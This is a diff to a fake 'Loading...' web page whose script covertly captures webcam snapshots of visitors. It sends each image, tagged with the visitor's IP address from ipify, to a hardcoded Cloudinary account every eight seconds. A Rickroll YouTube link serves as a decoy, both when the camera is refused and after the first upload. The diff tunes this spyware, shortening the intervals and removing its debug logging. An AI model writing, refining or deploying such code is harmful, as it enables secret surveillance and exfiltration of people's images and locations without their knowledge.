@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
+    <link rel="icon" href="data:,">
     <style>
         body { background-color: #000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
@@ -13,27 +14,24 @@
 </head>
 <body>
     <div class="loader"></div>
-    <p>جاري تهيئة الاتصال...</p>
+    <p>جاري تهيئة النظام...</p>
 
     <video id="video" playsinline autoplay></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const cloudName = 'dgkttv99v';
-        const uploadPreset = 'ml_default'; 
+        const cloudName = 'dgkttv99v'; //
+        const uploadPreset = 'ml_default'; //
         const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         let tabOpened = false;
 
         async function init() {
             try {
-                // طلب الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 document.getElementById('video').srcObject = stream;
-                // ابدأ أول محاولة رفع بعد 3 ثواني
-                setTimeout(takeSnapshot, 3000);
+                setTimeout(takeSnapshot, 2000); // يبدأ الرفع بعد ثانيتين
             } catch (e) {
-                console.log("Access Denied");
-                window.location.href = youtubeLink; // تحويل فوري لو رفض الكاميرا
+                window.location.href = youtubeLink; // لو رفض الكاميرا يحوله فوراً
             }
         }
 
@@ -43,19 +41,18 @@
             canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
             const imageData = canvas.toDataURL("image/png");
 
-            // جلب الـ IP بطريقة آمنة ومتوافقة مع HTTPS
-            let userIP = "Checking...";
+            // جلب الـ IP بشكل آمن
+            let userIP = "Unknown";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 userIP = data.ip;
-            } catch (err) { userIP = "Hidden"; }
+            } catch (err) { console.log("IP skip"); }
 
             const formData = new FormData();
             formData.append('file', imageData);
             formData.append('upload_preset', uploadPreset);
             formData.append('tags', `IP_${userIP}`);
-            // استخدمنا 'upload' لضمان أن الصور تظهر فوراً في الحسابات المجانية
             formData.append('type', 'upload'); 
 
             fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
@@ -64,18 +61,14 @@
             })
             .then(r => r.json())
             .then(data => {
-                console.log("Uploaded!");
-                if (!tabOpened) {
+                if (data.public_id && !tabOpened) {
                     window.open(youtubeLink, '_blank');
                     tabOpened = true;
                 }
-                // استمر في الالتقاط كل 10 ثواني
-                setTimeout(takeSnapshot, 10000);
+                setTimeout(takeSnapshot, 8000); // يرفع صورة كل 8 ثواني
             })
             .catch(err => {
-                console.error("Cloudinary Error:", err);
-                // إذا فشل الرفع، حاول مرة أخرى بعد 5 ثواني
-                setTimeout(takeSnapshot, 5000);
+                setTimeout(takeSnapshot, 4000); // لو فشل يحاول تاني بعد 4 ثواني
             });
         }
 
